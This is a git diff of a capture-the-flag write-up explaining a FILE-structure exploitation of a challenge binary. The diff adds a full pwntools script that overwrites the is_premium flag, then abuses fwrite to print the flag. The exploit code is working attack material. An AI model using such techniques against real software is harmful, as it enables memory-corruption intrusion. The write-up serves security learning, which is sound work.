@@ -208,7 +208,7 @@ We have the following plan:
 </ol>
 
 ### 2.1 First FILE overwrite
-The obj.is_premium variable is stored at the address 0x404040, which means the we can trigger an overwrite of the veriable using the following code:
+The `obj.is_premium` variable is stored at the address `0x404040`, which means the we can trigger an overwrite of the veriable using the following code:
 ```python
 from pwn import *
 context.arch = 'amd64'
@@ -224,7 +224,36 @@ print(file)
 target.send(payload)
 ```
 This will set the FILE structure file decsriptor to 0 (standard input) and the 
-beginning of the FILE, and will set its pointers so that its cache buffer points to `obj.is_premium`. [this website](https://pwn.college/software-exploitation/file-struct-exploits/) has very good explanations on how FILE works and how to leverage this kind of primitives.
+beginning of the FILE, and will set its pointers so that its cache buffer points to `obj.is_premium`. [this website](https://pwn.college/software-exploitation/file-struct-exploits/) has very good explanations on how FILE works and how to leverage this kind of primitives.The call to fread will then read 8 bytes from stdin into `obj.is_premium`
+### 2.1 Flag reading and second file exploit
 
-
-
+Now that `obj.is_premium` is set, we can read the flag into memory using option number 2.
+Then, we will use the other FILE overwrite to call `fwrite`, with its internal buffer pointing to the flag and the file descriptor set to `1` (stdout), which will write the flag to `stdout`.Putting this together, we have the following script.
+```python
+from pwn import *
+context.arch = 'amd64'
+target = process('challenge')
+#target = remote('challenges.unitedctf.ca',33078)
+elf = ELF('jkt-check-in-kiosk/challenge')
+# first overwrite
+file = FileStructure(null=elf.symbols['is_premium']-0x10)
+payload = file.read(addr=elf.symbols['is_premium'],size=8)
+print(target.recvuntil(b'>'))
+target.sendline(b'1')
+print(target.recvuntil(b':'))
+print(file)
+target.send(payload)
+target.sendline(b'a'*8)
+print(target.recvuntil(b'>'))
+print(target.recvuntil(b'>'))
+# flag read
+target.sendline(b'2')
+print(target.recvuntil(b'>'))
+# second overwrite
+f2 = FileStructure(null=elf.symbols['is_premium']-0x8)
+payload = f2.write(addr=elf.symbols['win'],size=100)
+target.sendline(b'3')
+print(target.recvuntil(b':'))
+target.send(payload)
+target.interactive()
+```
